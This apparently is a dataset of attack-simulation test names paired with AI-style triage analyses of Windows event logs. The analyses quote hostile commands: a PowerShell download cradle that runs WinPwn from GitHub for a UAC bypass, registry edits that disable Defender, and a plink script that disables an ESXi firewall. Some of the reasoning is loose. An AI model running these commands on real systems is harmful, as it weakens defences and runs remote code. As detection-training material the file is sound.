Disable Windows Prefetch Through Registry,"Upon analyzing the provided event logs, the following observations and assessments were made:

### System Log Analysis
1. **Time Changes**: There are several events related to changes in system time, typically triggered by the `svchost.exe` process. This indicates a time synchronization event, usually connected to Windows Time Service updating the system time, likely via an NTP server (`time.windows.com`). These changes are consistent with typical behavior and are caused by legitimate services.

### Sysmon Log Analysis
1. **Activity of `wevtutil.exe` and `conhost.exe`**: There are multiple instances of these processes running, initiated by the user `admin_test`. The `wevtutil.exe` is used for managing Windows events, including querying, backing up, and clearing logs. The presence of `conhost.exe` is typical as a console window host process.
  
2. **Execution of `hostname.exe` and `whoami.exe`**: These processes, executed by `admin_test`, are legitimate Windows utilities likely used for assessing system information. `hostname.exe` gets the system's name, and `whoami.exe` shows the currently logged-in user details.
   
3. **Registry Modification via `cmd.exe`**: The log shows a command to modify registry settings related to prefetcher parameters using `reg.exe`. While registry changes can be part of legitimate administrative tasks, they can also be indicators of malicious activities if they are unexpected or performed without authorization.

### Application Log Analysis
1. **Software Protection Platform Service**: A log entry regarding the Software Protection Platform Service is present. There's nothing alarmingly unusual here indicating a straightforward operation related to that service.

### Security Log Analysis
1. **Time Synchronization Logs**: The security logs also confirm the time synchronization recorded in the system logs, executed by `svchost.exe`, which is standard behavior for Windows Time Service.

### Assessment
- **Time Change Events**: Normal behavior for time synchronization with NTP servers.
- **Process Execution under `admin_test`**: While `hostname.exe` and `whoami.exe` executions are generally benign, the frequent execution of `wevtutil.exe` and modifications of registry settings (`cmd.exe`) should be typically evaluated in the context of administrative activities.
- **`reg.exe` Registry Change**: This appears the most suspicious considering it involves modifying system settings. However, without more context or indication of unauthorized access, this action alone may not justify a 'malicious' label. 

### Recommendation
The registry modification deserves further scrutiny, investigating whether this aligns with known changes by system administrators or if it arose unexpectedly. Additional context, such as potential triggering conditions or who instigated these changes, should be explored to establish intent or connect with other suspicious activities.

### Conclusion
Resolution: **SUSPICIOUS**

This assessment is inclined towards finding the logs suspicious due to the registry manipulation entry under `admin_test`, requiring additional inquiry to ensure these actions align with typical, authorized actions by system administrators. It is suggested to verify whether the user `admin_test` was legitimately executing these tasks or if credentials might have been misused."
Rundll32 syssetup.dll Execution,"Based on the Windows event logs provided for analysis, let's proceed with a detailed assessment of potential indicators of malicious activity.

### Detailed Analysis:

1. **Process Execution and Context:**
   - **Powershell and conhost Execution:** Notably, PowerShell (`powershell.exe`) and `conhost.exe` are executed by the user `SERVER002\\admin_test`. Frequent use of PowerShell without accompanying context or benign use cases can be suspicious due to its potential abuse in script-based attacks. However, no command-line arguments are provided to evaluate malicious intent.
   - **Event Utilities Usage:** The consistent invocation of `wevtutil.exe`, a utility for managing Windows Event logs, by `SERVER002\\admin_test` could be indicative of malicious activity, such as an attacker cleaning logs to cover tracks.
   - **Hostname and Whoami Execution:** The execution of `hostname.exe` and `whoami.exe` are typically benign as they are used for querying system information. However, their proximity in execution raises some level of curiosity about intention but is not inherently malicious.
   - **Unusual Execution Command-Line with rundll32:** The command line `""cmd.exe"" /c rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011_DefaultInstall.inf""` is suspicious. Usage of `rundll32.exe` to execute functions from DLLs is often exploited by attackers to execute malicious payloads. The file path and context imply a setup linking to a `.inf` file which could imply installation activities.

2. **Permission and Integrity:**
   - Processes have been executed with a ""High"" integrity level, suitable for an admin account (`admin_test`). While expected in legitimate administrative tasks, it raises concerns in potentially malicious contexts due to the elevated privileges.

3. **Parent-Child Process Relationship:**
   - All processes are initiated by `SERVER002\\admin_test` under the parent process `wsmprovhost.exe`, commonly related to Windows Remote Management. Continuous launching from the same parent process may suggest either a script automation or persistence techniques being utilized.

4. **Insights into Logs:**
   - The actions recorded seem to be run swiftly in a close sequence, likely an indication of a script or automated process execution, which requires further context to determine legitimacy.
   - Absence of any evident error messages or termination logs (any signs of process destruction or terminating signals), often used to stealthily exit after a task completion, monitor these activities.

### Assessment and Guidance:
- **Resolution:** **SUSPICIOUS**
  - The combination of `PowerShell` executions, `wevtutil` invocations, and particularly the `rundll32` command with unusual command-line parameters is atypical and indicative of suspicious activity.
  - It's paramount to conduct further investigation, including:
    - Validate the script in use and its business or IT necessity.
    - Cross-reference with scheduled tasks or system administrator's known activity.
    - Detect any matching hash values through threat intelligence for known compromises.
    - Evaluate the intent and origin of the temp `.inf` file and its influence on the system.

A thorough examination of the user's activity history, system integrity checks, and potentially consulting with the system or network owner for deliberate context is recommended. If these activities do not align with expected administrative tasks, consider isolating and dissecting the affected system in a controlled environment."
Modify UseTPMKeyPIN Registry entry,"## Detailed Analysis of Windows Event Logs

### **1. Security Log**
- There are two events with Event ID 4616, which pertain to system time changes. The process responsible for this is `svchost.exe`, running under the `LOCAL SERVICE` account. 
- **Analysis**: While changing system time could be used maliciously to manipulate time-based security features, the responsible process (`svchost.exe`) and the user (`LOCAL SERVICE`) are typical for time synchronization tasks, which are generally benign. The small discrepancy in time before and after suggests typical synchronization activity rather than manipulation.

### **2. Application Log**
- The application log contains events related to `edgeupdate` service stopping and an update from `Software Protection Platform Service`.
- **Analysis**: The edgeupdate service stopping could indicate either a routine shutdown or a possible interruption. However, given no evidence of malicious interference and routine system updates involving Edge, this appears benign.

### **3. System Log**
- Several events indicate system-wide settings adjustments, such as time zone or time changes, handled by `svchost.exe`. These are logged around the same timestamp as the security log events.
- **Analysis**: Since the changes are performed by a core Windows process responsible for handling network services and they align with the network time protocol (NTP) adjustments, this activity is typical and expected for a synchronized environment.

### **4. Sysmon Log**
- **Processes Executed**:
  - Multiple instances of `wevtutil.exe` and `conhost.exe` are run by the `admin_test` user. This is notable for an analysis as `wevtutil.exe` interacts with event logs which could be used to clear or tamper with logs.
    - The command line for these executions is not detailed, which leaves room for potential misuse.
  - **Edge Update Activity**: Multiple entries related to `MicrosoftEdgeUpdate.exe` showing different operations like service registration (`/regserver`) or update (`/ua /installsource core`). This activity is consistent with legitimate software update procedures.
  - **Potentially Malicious Registry Modification**: The command line `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f` was executed. This modification alters settings related to BitLocker, a drive encryption service.
    - **Contextual Analysis**: The registry change to the BitLocker settings suggests a higher-level modification, potentially indicating an attempt to configure or disable security features on drive encryption.

### **Assessment**
In the given logs, the main concern arises from the registry modification attempt via the command line. While individual administrative scripts could result in such changes during legitimate administrative tasks, this type of registry operation, especially when conducted at scale or in suspicious circumstances, can be indicative of attempts to weaken system security features.

- The other activities, such as the time changes, log events being triggered, and update activities, can be considered typical for a system carrying out updates and synchronizations, governed by core processes and likely scheduled tasks.

### **Resolution**: **SUSPICIOUS**
- **Additional Investigation Required**: The registry modification related to BitLocker settings needs further investigation by confirming if this change was planned or executed by authorized personnel. The frequent execution of `wevtutil.exe` should be reviewed alongside any script logs or job schedules to validate intent and legitimacy.
- **Guidance**: Analyze access logs and seek correlation with known maintenance windows or authorized administrative execution. Meanwhile, ensure the integrity of critical systems and monitor for any subsequent suspicious behavior, especially new attempts to alter system security settings.

### Recommendations
1. **Review Administrative Access Logs**: Ensure the `admin_test` user activities are verified against maintenance logs.
2. **Audit Registry Changes**: Investigate whether the registry change was authorized, considering potential implications on BitLocker security.
3. **Monitor for Anomalies**: Continue to monitor this server closely for any further signs of unauthorized or unexpected behavior.
4. **Verify System Hardening**: Confirm security settings and policies are enforced consistently, particulary related to encryption and user privileges. 

The activities found warrant caution, but without immediate confirmation of malicious intent, the next steps focus on deeper context review rather than immediate escalation or reactionary measures."
MSBuild Bypass Using Inline Tasks (VB),"Upon analyzing the provided Windows event logs, I have identified a series of events and processes, mainly focusing on two aspects: potentially suspicious activities within the Sysmon logs and routine operations within the Security and Application logs. Let's break down the analysis:

### Sysmon Log Analysis:
1. **Processes Executed by admin_test User:**
   - Several instances of legitimate Windows processes (`powershell.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `msbuild.exe`, `vbc.exe`) were executed by the user `SERVER002\admin_test`. While these processes are common, their context is essential.
   - The use of `msbuild.exe` is noteworthy. It is sometimes abused by attackers (Living-off-the-Land Binaries, LOLBins) for payload execution as it can compile and run .NET code directly. The command line includes `vb.xml`, which might be an attempt to execute something suspicious or a routine operation. The execution chain involving `cmd.exe`, `msbuild.exe`, and `vbc.exe`, along with files situated in transient directories like ""Temp"", should be investigated further. 

2. **Execution of `wevtutil.exe`:** 
   - This utility is used to manage Windows event logs, potentially indicating an attempt to clear or query event logs, which can be suspicious depending on the context and frequency.

3. **Miscellaneous Microsoft Edge Update Processes:**
   - A series of legitimate Microsoft Edge Update processes executed by `NT AUTHORITY\SYSTEM` occur. These appear to be a routine update process, likely tied to regular system maintenance or updates.

4. **Routine System Processes:**
   - System processes such as `sppsvc.exe` and `TiWorker.exe` are part of Windows services for software protection and system updates, executed by `NT AUTHORITY\SYSTEM` and seem benign.

### Security and Application Log Analysis:
- **Security Logs:**
  - The logs denote successful logins (4624) and special privileges assigned to the `SYSTEM` user (4672). The logon events with type 5 indicate a service startup, which matches the expected activity on a server.
  - No evidence of unauthorized logon attempts or explicit privilege escalations beyond routine operations.

- **Application Logs:**
  - Logs related to the Software Protection Platform and Edge updates show no signs of errors or unusual activity indicating compromise.

### Conclusion:
The activity involving the `admin_test` user executing `msbuild.exe` with the `vb.xml` file from a temporary directory is potentially suspect and could suggest an attempt at code execution or deployment via a less common method. This chain of tool usage by the `admin_test` on a server system warrants further investigation to rule out possible misuse or malicious activity, despite much of the log activity appearing routine.

### Resolution:
- **SUSPICIOUS:** 
  - While many activities appear routine, the specific use of build tools (`msbuild.exe`, `vbc.exe`) in a possibly unintended context points to behavior warranting further scrutiny before defiantly categorizing as benign or malicious.
  
### Recommended Actions:
- Conduct an in-depth analysis of the `vb.xml` file, checking for any unusual scripts or payloads.
- Review user permissions and past activities for `admin_test` to determine the legitimacy of this process execution.
- Monitor for any further suspicious behavior involving the misuse of common system binaries."
Disable Windows Shutdown Button,"To thoroughly assess the provided Windows event logs for potentially malicious activities, we'll analyze and summarize the key findings from various logs:

1. **Time Discrepancy Logs (Security Log - Event ID 4616):** 
   - There are events indicating a backward time change on the system. The time was set from ""2024-10-24 14:59:50"" back to ""2024-10-24 14:59:48"".
   - Such changes are often unusual and can be a red flag as attackers sometimes alter system time to either attempt to bypass time-based detections or tamper with system logs.

2. **Privilege Escalation Attempt (Security Log - Event ID 4672):** 
   - The `admin_test` user was granted a set of advanced privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges can be indicative of potentially malicious activities since they provide an elevated capability for system manipulation and are typically not required for normal operations.

3. **Remote Logon Using NTLM (Security Log - Event ID 4624):** 
   - The `admin_test` account logged in using NTLM from a workstation named `DESKTOP-3HL5B2P`. NTLM is less secure than other authentication protocols and its use could suggest an attack vector, especially if not common for this environment or user.

4. **Suspicious Command Execution (Sysmon Log - Event ID 1):** 
   - A command was executed to modify registry settings: 
     ```
     ""cmd.exe"" /c reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
     ```
   - This action is a direct modification of a registry setting related to system policies, indicating an attempt to influence system behavior, which is often part of a malicious script or attack methodology.

5. **Repeated Use of System Utilities (Sysmon Log - Event ID 5):**
   - Frequent use of system utilities like `wevtutil.exe`, `reg.exe`, and `cmd.exe` by the `admin_test` user could be part of a legitimate script or automated task but is commonly seen in the execution of an attack script or penetration testing tools.

**Assessment:**
The activity presented in these logs exhibits multiple indicators of potentially malicious activities, such as time alteration, privilege escalation, and suspicious command execution aimed at registry changes and system manipulation. Taken together, these events strongly suggest unauthorized user behavior that may be indicative of a security compromise.

**Resolution:**
- **MALICIOUS**: The evidence suggests deliberate attempts at system manipulation and exploitation that are characteristic of malicious activity.

**Guidance on How to Proceed:**
1. **Immediate Action:** 
   - Isolate `Server002` from the network to prevent the spread or continuation of malicious actions.
   - Perform a full investigation of the `admin_test` user's account activities and credentials.
    
2. **Log Analysis & Forensics:**
   - Conduct a full forensic analysis on `Server002` to confirm the scope, origin, and intent of the observed activities.
   - Review logs from associated systems and account for potential lateral movement.

3. **Remediation & Security Measures:**
   - Remove unauthorized changes to system settings and restore the system to a known good state.
   - Reset passwords and revoke privileged sessions for `admin_test` and potentially impacted accounts.
   - Strengthen network security policies, including restriction on NTLM usage and privilege management.

4. **Report Findings:**
   - Document the incident and report findings to the appropriate security teams for action and remediation.
   - Consider legal consultation if personal or sensitive data may have been compromised."
Enable Proxy Settings,"Upon conducting a detailed analysis of the provided logs, here's a breakdown of the key observations:

### Security Log Analysis:
- **EventID 4616:** Related to system time changes. These events show the `svchost.exe` process altering system time, which can occur due to legitimate reasons like time synchronization with time servers. However, consistent or unexplained time adjustments can also be exploited to cover tracks or synchronize coordinated attacks.

### Application Log Analysis:
- No apparent signs of malicious activity. The log entry is related to the Software Protection Platform Service, which is a legitimate Windows service.

### System Log Analysis:
- **EventID 1 and 24 (Kernel-General):** Frequent time changes are logged, similar information as in the Security Log. The time adjustments in isolation, without other suspicious indicators, would generally be viewed as benign, reflecting typical system synchronization attempts.

### Sysmon Log Analysis:
- **Process Creation Events:** Frequent execution of `wevtutil.exe` and `conhost.exe` is observed under the user `SERVER002\admin_test`. The utility `wevtutil.exe` is often used for exporting and clearing event logs, which in combination with `cmd.exe` being used to manipulate registry settings (`reg add` command), can be an indicator of an attempt to manipulate or suppress event logs—potentially hiding malicious activities.

- **Manipulation of Internet Settings Registry Key:** Execution of `cmd.exe` with command-line arguments specifically targeting the registry key for proxy settings (`HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings`). This action can indicate an attempt to redirect network traffic through a proxy for malicious purposes or data exfiltration.

- **Integrity Level:** High integrity level indicates elevated permissions used for executing the commands, which might suggest privilege escalation risks if `admin_test` should not have such privileges.

### Key Suspicious Behaviors:
1. **Frequent Invocation of `wevtutil.exe`:** Suggests potential intentions to clear logs, which could indicate hiding tracks of unauthorized or dubious activities.
   
2. **Registry Modification via Command Line:** Changing proxy settings directly goes beyond typical user behavior and may reflect a deeper security threat.

3. **High Integrity Level Processes:** Processes like `cmd.exe` altering registry entries under high privilege raises flags about possible elevated privilege abuse.

### Conclusion:
The combination of frequent event log manipulation tools, direct registry modifications affecting system/network configurations under an administrative account (`admin_test`), and the use of processes with high integrity levels without clear operational justification leads to a concerning scenario.

### Resolution:
**SUSPICIOUS** - The identified activities warrant further investigation to confirm or refute the presence of malicious intent. Follow-up actions should include:
- Detailed examination of the `admin_test` user's activities and recent changes.
- Network traffic analysis to assess any unauthorized data exfiltration or unusual connections.
- Validation of system integrity, focusing on permissions and access control settings.
- Engaging in threat hunting to seek potential artifacts or indicators of compromise elsewhere in the network."
WinPwn - UAC Magic,"Upon reviewing the provided Windows event logs, there are several indicators of potentially malicious activity:

1. **PowerShell Event Logs**: The logs show the execution of a PowerShell script with the following command, invoking a UAC bypass technique:
   ```
   HostApplication=powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
   iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic}
   ```
   This indicates the download and execution of a script from a GitHub repository potentially containing a PowerShell post-exploitation framework. The use of `iex(new-object net.webclient).downloadstring` to directly execute a script from the internet is a common technique used in malicious activities, specifically to bypass User Account Control (UAC) by executing with elevated privileges.

2. **Security Event Logs**:
   - Event ID 4672 shows `admin_test` obtaining a series of high privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be used for privilege escalation or to perform actions requiring elevated privileges often encountered in malware activity.
   - Event ID 4624 indicates a network authentication using NTLM (LogonType 3), and might indicate lateral movement from another system `DESKTOP-3HL5B2P` using NTLM which is sometimes an indication of Pass-the-Hash attack.

3. **Sysmon Event Logs**:
   - Several instances of PowerShell and command shells (`conhost.exe`) running with `SERVER002\admin_test` user privileges, suggest command execution which ties back to the PowerShell script execution log shown earlier.
   - The sequence of executing processes like `wevtutil.exe` and `conhost.exe` under the same user could indicate attempts to manipulate event logs to erase traces of malicious activities.

Overall Analysis:
- The combination of a known PowerShell dowload and execution technique from third-party sources, the bypassing of UAC, and the usage of high-privileged security tokens suggests strong evidence of malicious activity. 
- There is a high likelihood that the system was compromised, and an unauthorized actor potentially gained elevated access with the capability to perform actions under the `admin_test` account.
  
Recommended Actions:
- Immediately isolate the host `Server002` from the network to prevent further compromise or lateral movement.
- Perform a thorough forensic analysis on the system to understand the full extent of the compromise, including identifying any persistence mechanisms.
- Review network traffic logs for other potentially compromised machines or suspicious connections.
- Investigate the user's account `admin_test` for unauthorized actions or changes.
- Consider resetting local administrative privileges and credentials.
- Notify the incident response team to initiate containment and remediation plans.

Resolution: **MALICIOUS**"
Delete TeamViewer Log Files,"Upon analyzing the provided Windows event logs, here are some key observations and an evaluation regarding potential suspicious or malicious activity:

### Windows PowerShell Logs
- **PowerShell Command Execution:**
  - The logs indicate the execution of a PowerShell command that creates and then instantly removes a file (`TeamViewer_54.log`) in a temporary directory. This behavior is often considered suspicious as it may be used to avoid leaving traces on the system.
  - Command: `powershell.exe & {New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore}`.
  - Creating and removing a file immediately could imply an attempt to obfuscate actions or check for write permissions without leaving evidence, which is a common tactic in malicious activities.

### System Logs
- **Time Adjustment:**
  - The system logs record the adjustment of the system time, a task performed usually by service processes like svchost.exe. Although time changes can be legitimate for synchronization, persistent, and unauthorized manipulations might indicate tampering attempts.
  - However, the time adjustment here aligns with legitimate sources (""time.windows.com""), suggesting typical synchronization behavior.

### Security Logs
- **Time Change Correlation:**
  - Security logs reflect the change in system time as seen in the system log, correlating with a service account operation (`LOCAL SERVICE`). There's no indication of unauthorized user action in this particular case.

### Application Logs
- **Edge Update Activities:**
  - Logs show entries of Microsoft Edge Update operations. They reflect typical activities of software updates, consistent with a legitimate application behavior.

### Sysmon Logs
- **Process Listings:**
  - Several processes related to system maintenance and Microsoft Edge Update were observed. Processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and various Edge Update components were executed under legitimate circumstances and do not immediately suggest anomalous behavior.
  - Notably, `whoami.exe` was run, typically used to display user information, which might be part of regular administrative tasks.

### Assessment
- **Suspicious Activity Identified:**
  - The PowerShell command detected is considered suspicious. While it is not definitively malicious alone, it does indicate behavior consistent with attempts to minimize log files or perform unauthorized checks without leaving a trace.
  - Further investigation is recommended to determine the intent and origin of the PowerShell command. It is especially necessary to verify the how and why such commands are being issued on `Server002`.

### Conclusion and Next Steps
- **Resolution:** **SUSPICIOUS**
- **Recommended Actions:**
  1. **Review User Activities:** Check user accounts active on `Server002` around the timestamp for any unauthorized users or anomalies in logins.
  2. **Correlate with Additional Logs:** Gather additional logs (e.g., network, additional endpoint logs) to trace further activities linked to the PowerShell execution.
  3. **Monitor for Recurrences:** Implement monitoring on PowerShell activities with restrictions on script feature usage to see if similar commands execute again.
  4. **Conduct a Security Audit:** Evaluate overall security configurations of `Server002` for vulnerabilities that may permit such actions without detection.

Pending these investigations, a decision regarding the threat's severity and necessary remediation steps can be more fully determined."
Abusing MyComputer Disk Backup Path for Persistence,"### Detailed Analysis of Event Logs:

#### 1. Time Jump Events:
- **Security and System Logs** have events (Event ID 4616 and 1) indicating changes in system time on 2024-10-24 from 20:37:28 to 20:37:24 and then adjusted correctly. This process was executed by ""svchost.exe"", under ""LOCAL SERVICE"". Time changes can be used by attackers for log manipulation to hide tracks.
  
#### 2. Registry Modification via cmd.exe:
- **Sysmon Logs** show an execution of **cmd.exe** with the command line: `reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""C:\Windows\system32\notepad.exe"" /f` performed by ""SERVER002\admin_test"". Executing registry changes, especially under a high integrity level, can suggest potential persistence mechanisms.

#### 3. Utility Executions with Elevated Access:
- The frequent use of legitimate system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by a single user (""SERVER002\admin_test"") may indicate an anomaly. These are executed numerous times within a short period.

#### 4. Microsoft Edge Update Services:
- There are multiple events regarding the execution of the Microsoft Edge Update service and components. This involves several processes running under ""NT AUTHORITY\SYSTEM"". This is typically benign as it reflects routine software updates, though it should be verified that the paths and files match official Microsoft components.

### Assessment:
- The use of `cmd.exe` to modify the registry is suspicious and may be indicative of an attempt to establish persistence or manipulate the system configuration maliciously.
- The time change events could either be benign or malevolent, but they coincide with other suspicious activities (registry modification), requiring further inquiry.
- Recurrent executions of sys-admin utilities within a short period may indicate an administrative task but could also be characteristic of someone trying to hide actions or gather system information.

### Resolution:
**SUSPICIOUS** - The logs show registry alterations via command line, changetime events, and the use of several system utilities in quick succession. These indicators suggest potentially undesirable activity that warrants further investigation to verify the context and legitimacy of these actions. Investigate the user's intent and check for potential malware associated with abnormal system and registry changes."
Delete Microsoft Defender ASR Rules - GPO,"Upon analyzing the provided Windows event logs, I thoroughly examined each event across the Security, System, Application, Sysmon, and Windows PowerShell logs. The investigation focused on identifying any suspicious or anomalous behavior that may indicate malicious activity or potential compromise. Below is a detailed analysis of key findings:

### Detailed Analysis:

1. **Security Logs:**
   - The entries show time synchronization events (EventID: 4616) involving the LOCAL SERVICE account adjusting the system time. Such tasks are typically benign and part of routine system operations to ensure time consistency across the network.

2. **System Logs:**
   - The logs include information about time adjustments and changes in the time source selection (EventID: 35). These appear to be standard operations performed by the Windows Time service and do not indicate malicious activity.

3. **Application Logs:**
   - The entry related to the Software Protection Platform Service (EventID: 16384) is a usual activity seen during the regular operation of a Windows system, managing software licensing.

4. **Sysmon Logs:**
   - Events indicate the execution of common system utilities such as `wevtutil.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. The execution of `powershell.exe` with a script modifying and then removing registry entries related to Windows Defender Exploit Guard ASR Rules could be potentially suspicious. However, the script removes the registry entry after creation, indicating it may be part of a legitimate check or update process, often seen in administrative or configuration management tasks.

5. **Windows PowerShell Logs:**
   - The PowerShell logs capture a script run that manipulates registry entries regarding Windows Defender Exploit Guard ASR Rules. This matches the Sysmon entries for `powershell.exe` execution. While registry modification using PowerShell can be a red flag, it is essential to determine the origin and purpose of this script. In an administrative context, such operations might be intended for configuration management or compliance.

### Assessment:

- The PowerShell script activity warrants further investigation due to its registry modification actions, although it appears to follow a complete cycle of insertion and deletion, which might be a sign of a security compliance check or automated policy enforcement script.
- Since there's no evidence of privilege escalation, anomalous network activity, or execution of known malicious processes, the rest of the activities across logs appear to fall within normal operational thresholds for this Windows system.

### Conclusion:

**Resolution: SUSPICIOUS**

The logs contain activity that, while it may not be definitively malicious, exhibits characteristics that warrant further investigation to ensure it aligns with expected operational procedures. Specifically, the registry modifications via PowerShell should be reviewed:
- Verify the source and necessity of the PowerShell script.
- Check if the modifications are consistent with internal security or IT policies.
- If not authorized, ensure the environment is scanned for potential misconfigurations or indicators of compromise, particularly focusing on sources executing PowerShell scripts.

Continued monitoring and auditing are recommended to ensure the environment remains secure and any unintended changes are quickly addressed."
Tamper with Windows Defender Registry - Powershell,"Upon a detailed examination of the events from various logs (Application, Windows PowerShell, Sysmon, System, and Security), we will summarize the analysis focusing on signs of any suspicious or malicious activity.

### Detailed Analysis:

1. **Unusual PowerShell Activity:**
   - The logs display a series of PowerShell commands that modify Windows Defender settings to disable protections such as anti-spyware, anti-virus, and real-time monitoring.
   - This is done through multiple registry modifications with commands like:
     - `Set-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1`
     - These commands effectively neutralize Windows Defender’s protective features.

2. **Process Execution Logs (Sysmon):**
   - Multiple instances of legitimate Windows processes like `conhost.exe`, `wevtutil.exe`, and others running under `SERVER002\admin_test`. 
   - Most processes executed are standard and expected; however, their timing coincides with the PowerShell script execution to disable security features, raising concerns of process tampering or misuse.

3. **Edge Update Logs:**
   - Several logs capture the Microsoft Edge update process. These activities appear normal and show typical update operations.

4. **System Time Adjustments:**
   - The system logs have entries regarding time synchronizations (`EventID: 1` in `Microsoft-Windows-Kernel-General`). This activity itself is benign if system time corrections align with expected time source updates.

### Assessment:
- **Indicators of Compromise (IOCs):**
  - The PowerShell registry command sequence to disable Windows Defender is highly suspicious and a typical behavior observed in malicious activities aimed at deactivating security measures to facilitate further unauthorized actions without detection.

- **Risk and Threat Assessment:**
  - The disabling of security settings in Windows Defender could expose the system to various threats, including malware, unauthorized data access, or network breaches.

### Guidance:
Based on the analysis, the logs indicate activity that could be part of an attempted or ongoing compromise. This necessitates further investigation to determine intent, source, and any subsequent actions taken after security features were disabled.

- **Immediate Actions:**
  - Conduct a full malware scan using an external or offline tool.
  - Review user `SERVER002\admin_test` activities, credentials, and access privileges.
  - Evaluate network traffic for suspicious outbound connections during or after the identified incident time.
  
- **Long-term Actions:**
  - Implement stricter PowerShell execution policies and logging.
  - Conduct a detailed security assessment of the affected host to determine potential vulnerabilities and mitigate them.
  - Review and enforce security best practices and user training to prevent future incidents.

### Resolution:

**MALICIOUS** - The logs contain clear indications of malicious activities via PowerShell commands that disable core Windows Defender protection features. This aligns with a typical tactic used in security breaches, aimed at reducing system defenses to conduct further compromised operations."
ESXi - Disable Firewall via Esxcli,"Upon reviewing the provided Windows event logs, several pieces of information and activities stand out that warrant further investigation to determine their context and potential malicious intent:

1. **PowerShell Execution:**
   - The `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` was executed by `SERVER002\admin_test`.
   - PowerShell is a powerful tool that can be used for legitimate system administration tasks as well as malicious activities. However, without further details on the command-line arguments or specific actions taken, this entry alone is not definitively suspicious but demands further inquiry.

2. **Use of `wevtutil.exe`:**
   - The executable `wevtutil.exe` is repeatedly leveraged by `SERVER002\admin_test`. This tool is typically used to read or manipulate event logs, which might be part of normal administrative tasks. However, if a malicious user wanted to cover their tracks, they might use `wevtutil.exe` to clear logs or modify entries, which could be suspicious if not part of a known maintenance routine.

3. **Execution of `cmd.exe` with Specific Command:**
   - There is an execution of `cmd.exe` with a command line that includes `plink.exe` to connect via SSH to a host `file.local` with administrative credentials (`root`) and a potentially dubious file `esxi_disable_firewall.txt`.
   - This specific entry is notably concerning as it indicates a command intended to disable security mechanisms on another system, likely without authorization.
   - The use of `plink.exe` in combination with administrative credentials (`root`) and the specific script `esxi_disable_firewall.txt` is highly indicative of an intent to compromise or lower the security of an ESXi host.

4. **Microsoft Edge Update Activity:**
   - Multiple entries indicate Microsoft Edge Update-related activities, such as `MicrosoftEdgeUpdate.exe` executions. These are most likely legitimate software update processes given they are executed by `NT AUTHORITY\SYSTEM` and involve known Microsoft Edge paths and valid digital signatures (SHA256 hashes).

**Assessment:**
- **Primary Concern:** The execution of `cmd.exe` for running `plink.exe` to disable a firewall seems anomalous and potentially malicious. This indicates activity that might aim to compromise an external system by disabling its firewall.
- **Further Investigation Required:** The frequent use of `wevtutil.exe` needs further context. It's important to verify if it's part of standard operating procedures or if it's trying to obscure traces of unauthorized activities.
  
**Resolution:**
- **SUSPICIOUS:** The activities in the provided logs, particularly the use of `plink.exe` with a script related to disabling firewalls, suggest that these actions are suspicious and warrant immediate investigation. Further scrutiny is needed to determine whether these actions were authorized or part of malicious intent.
  
**Guidance:**
1. **Immediate Investigation Required:** Investigate the purpose of the script `esxi_disable_firewall.txt` and verify if the activity was sanctioned or an attempt to bypass network security.
2. **User Verification:** Review the recent activities and responsibilities of the user `SERVER002\admin_test` to assess if there's any indication of credential compromise or misuse.
3. **Log Review and Monitoring:** Further analyze logs around the time of suspected activities and continue to monitor for similar attempts. Confirm if the use of `wevtutil.exe` correlates with any modifications to log entries indicating attempts to cover tracks.
4. **System Hardening:** Check and ensure that command-line tools like `plink.exe` used in an unauthorized manner are reviewed and restricted if necessary, while also assessing and securing ESXi hosts against unauthorized access or configuration changes."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Based on the provided Windows event logs, here is the analysis:

### Analysis:
1. **Repeated Execution of System Utilities:**
   - There are multiple Sysmon events for processes such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `conhost.exe`, `whoami.exe`, and `msiexec.exe`. These are commonly used tools that can indicate normal administrative activity. However, in some contexts, they might also suggest suspicious behavior, especially if they are triggered in unusual sequences or frequencies.

2. **Command Execution:**
   - The logs show a `cmd.exe` process executing `msiexec.exe` with an MSI installation within a temporary directory:
     ```
     ""CommandLine"": ""\""cmd.exe\"" /c c:\\windows\\system32\\msiexec.exe /q /i \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_EXE.msi\""""
     ```
     This could be part of normal software installation/updates, but the use of a temporary directory can be flagged for further inspection.

3. **Unusual MSI Activity:**
   - Associated `MsiInstaller` events indicate that a product named ""file file Test Installer"" was installed. While this could be benign, the naming convention of the product is somewhat suspicious and non-standard.

4. **Execution of Temporary Files:**
   - The Sysmon log shows a temporary file being executed (`C:\\Windows\\Installer\\MSIA30E.tmp`). This type of file execution, often in conjunction with installation processes, warrants scrutiny, especially if the file lacks a valid product and company description.
   - The parent process of this execution is `msiexec.exe`, suggesting it's part of the installation process, but the lack of detail in the file version and description could indicate a custom or unknown application.

5. **Microsoft Edge Installer:**
   - There are multiple processes related to the Microsoft Edge update and installation:
     - `MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe`
     - `setup.exe`
